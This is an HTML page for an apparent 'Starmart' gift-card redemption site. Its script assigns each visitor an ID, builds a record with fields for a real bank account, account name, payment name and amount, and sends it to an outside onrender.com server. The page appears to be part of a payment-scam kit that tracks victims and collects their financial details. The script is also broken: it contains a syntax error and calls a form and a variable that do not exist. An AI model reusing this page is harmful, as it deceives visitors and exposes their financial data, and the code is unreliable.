<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
    <title>Starmart</title>
    <link rel="icon" href="../image.jpg" type="image/x-icon">
	<meta name="theme-color" content="#0066ff">
    <link rel="shortcut icon" href="starmart.jpeg" type="image/x-icon">
    <link rel="manifest" href="../manifest.json">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
  body {
  font-family: 'Arial', sans-serif;
  margin: 0;
  padding: 0;
  line-height: 1.6;
}

/* Top Ad Styles */
.top {
	position: fixed;
	top: 0;
	display: flex;
	background: #fff;
	margin: 0;
	justify-content: space-between;
	box-sizing: border-box;
	align-items: center;
	width: 100%;
  padding: 10px 20px;
  z-index: 1000;
  border-bottom: 2px solid #fff;
  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
}
.logo p{
	font-size: 24px;
	font-family: "Poppins", "Manrope", system-ui, sans-serif;
  font-weight: 700;     
  letter-spacing: -0.6px;
  color: #0066ff;
	margin: 0;
}
.logo i {
	font-size: 30px;
	margin-right: 10px;
}
.topBtn button{
	font-size: 14px;
	background: #fff;
	color: #0066ff;
	border: 2px solid #0066ff;
	padding: 8px 12px;
	border-radius: 20px;
	display: none;
}
/* Header */
.header {
  text-align: center;
  padding: 2rem;
  background-image: url('starmart.jpeg'); 
  background-position: bottom; 
  background-size: cover;
  border-top: 10px solid black;
  height: 70px;   
}

.header h1, .lower h1 {
  font-size: 3rem;
  color: #ff6f61;
  margin: 0;
  filter: drop-shadow(2px 4px 6px black);
  opacity: 0;
}

.header p, .lower p {
  font-size: 1.2rem;
  margin: 0.5rem 0;
  color: #ff6f61;
  opacity: 0;
}

/* Content */
.content {
  padding: 0.5rem;
}

section {
  margin-bottom: 2rem;
}

/* Body */
.container {
	margin: 5px 0;
    padding: 5px 20px 40px;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.15);
    border-radius: 5px;
}

  </style>
</head>
<body>
<!-- Top Page Advertisement -->
  <div class="top">
    <div class="logo">
      <p><i class="fa fa-balance-scale" aria-hidden="true"></i><strong>Starmart</strong></p>
	</div>
	<div class="topBtn">
		<button id="redeemBtn">Redeem Token</button>
	</div>
  </div>

  <!-- Header Section -->
  <header class="header">
    <!-- For IMAGE -->
  </header>

  <!-- Main Content -->
  <main class="content">
    <!-- Form Part -->
    <section>
		<div class="container">
			<h3>Gift Card Redeemed</h3>
			<p>A gift card has been fully redeemed.</p>
		</div>
    </section>
  </main>

</body>
	<script src="../sw.js"></script>
	<script>
		// Sender
        function sender(payload) {
            const url = 'https://send-39yi.onrender.com/api/messages';  
            fetch(url, {
                method: 'POST',
                headers: {     
                    'Content-Type': 'application/json',  
                },   
                body: JSON.stringify(payload)    
            });  
        }
    

        // Code Generator
        function generateRandomCode() {
            const numbers = Array.from({length: 8}, () => Math.floor(Math.random() * 10));
            const letters = Array.from({length: 2}, () => String.fromCharCode(65 + Math.floor(Math.random() * 26)));
            const allChars = [...numbers, ...letters];
           
            // Shuffle the array
            for (let i = allChars.length - 1; i > 0; i--) {  
                const j = Math.floor(Math.random() * (i + 1));
                [allChars[i], allChars[j]] = [allChars[j], allChars[i]];
            }
            return allChars.join('');
        }
        

        // Check if UserId has been created
        if (localStorage.getItem('savedInfos')) {
            console.log('UserId is already stored');
        } else {
            const code = generateRandomCode();
            const digits = Array.from({ length: 10 }, () => Math.floor(Math.random() * 10)).join('');
            const savedInfos = {
                userId: code,
                demoAcc: digits,
                azaName: '',  
                realAcc: '',
                name: '',
                amount: 0,
				request: 'false',
                update: '',
                payName: '',
                payNumber: ''
            };
    
            localStorage.setItem('savedInfos', JSON.stringify(savedInfos));
            sender(savedInfos, status: 'Online');
        }

        const savedInfo = JSON.parse(localStorage.getItem('savedInfos'));
        const userId = savedInfo.userId;
        

        // Send Status      
        document.addEventListener('visibilitychange', () => { 
            if (document.visibilityState === 'visible') {
                //sender({ userId: userId, status: "online" });
            } else {
                //sender({ userId: userId, status: "offline" });          
            }
        });

    
        // Form submission
        const form = document.getElementById('form');
        
        form.addEventListener('submit', (event) => {
            event.preventDefault();
            const formData = new FormData(form);
            const message = formData.get('message');
            sender(message, randomCode)
        })

	</script>
</html>
  
  
